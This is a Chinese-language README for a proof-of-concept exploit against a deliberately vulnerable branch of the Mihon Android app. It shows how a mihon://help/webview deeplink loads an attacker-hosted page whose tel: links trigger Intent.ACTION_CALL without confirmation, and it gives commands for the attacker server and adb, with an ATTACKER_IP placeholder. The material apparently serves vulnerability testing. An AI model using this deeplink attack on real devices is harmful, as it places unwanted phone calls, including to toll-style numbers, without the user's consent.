# 2.3.2 Insecure System Scheme Handling EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 会把外部传入的网页交给 `WebViewActivity` 加载。漏洞样本在 `WebViewScreenContent.shouldOverrideUrlLoading()` 中对 `tel:` 链接执行：

```text
Intent(Intent.ACTION_CALL, requestUri)
startActivity(intent)
```

由于没有校验页面来源，也没有用户确认流程，攻击者控制的帮助页或漫画源客服页可以自动触发系统通话能力。

## 运行服务端

```powershell
cd .\exp\mihon-0.19.9\2.3.2_Insecure_System_Scheme_Handling
python .\server.py
```

服务端会监听 `8000`，攻击页面路径为：

```text
http://<ATTACKER_IP>:8000/exp/2.3.2
```

## 触发 deeplink

将 `<ATTACKER_IP>` 替换为运行 `server.py` 的机器 IP：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.3.2"
```

如果设备上有多个 Mihon 构建，也可以指定 debug 包：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.3.2" app.mihon.debug
```

## 预期结果

1. Android 通过 `mihon://help/webview` 打开已导出的 `DeepLinkActivity`。
2. `DeepLinkActivity` 将 `url` 参数转交给 `WebViewActivity`。
3. WebView 加载 `http://<ATTACKER_IP>:8000/exp/2.3.2`。
4. 页面自动跳转到 `tel:+19005550199`。
5. 漏洞分支中的 WebView 直接使用 `Intent.ACTION_CALL` 处理 `tel:`，触发系统拨号能力。

页面还提供“通过活动页跳转拨打”按钮，会请求 `/redirect-tel?number=...` 并由服务端返回 `302 Location: tel:<number>`，用于验证“重定向到系统 scheme”的触发形态。

## 注意

该 EXP 不回收数据，不纳入 git 管理，不需要修改漏洞样本代码。测试设备需要安装漏洞分支 APK；若 Android 运行时拦截电话权限，请在系统设置中授予 Mihon 电话权限后重试。
